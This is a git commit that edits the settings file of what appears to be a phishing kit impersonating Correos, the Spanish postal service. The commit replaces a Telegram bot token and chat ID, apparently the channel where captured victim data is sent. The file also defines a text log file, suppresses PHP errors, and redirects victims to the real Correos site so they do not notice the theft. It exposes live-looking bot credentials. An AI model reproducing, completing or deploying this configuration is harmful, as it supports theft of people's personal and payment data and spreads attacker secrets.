09c9d0d9ab3162cf506898a04617a8fb346731f1
HamadaRIgaloo <119463837+HamadaRIgaloo@users.noreply.github.com>
2022-12-03 16:03:28 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5685344408:AAFecHM0jruHFn06IdPB2uEwBf1UpiyaDaI");
-define("TELEGRAM_CHAT_ID", "863944893");
-define("TELEGRAM_CHAT_IDD", "-863944893");
+define("TELEGRAM_TOKEN", "5856755195:AAHlySNc4BZ80yzJbHpcRKJAYCYqaf5vegI");
+define("TELEGRAM_CHAT_ID", "869785984");
+define("TELEGRAM_CHAT_IDD", "-869785984");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
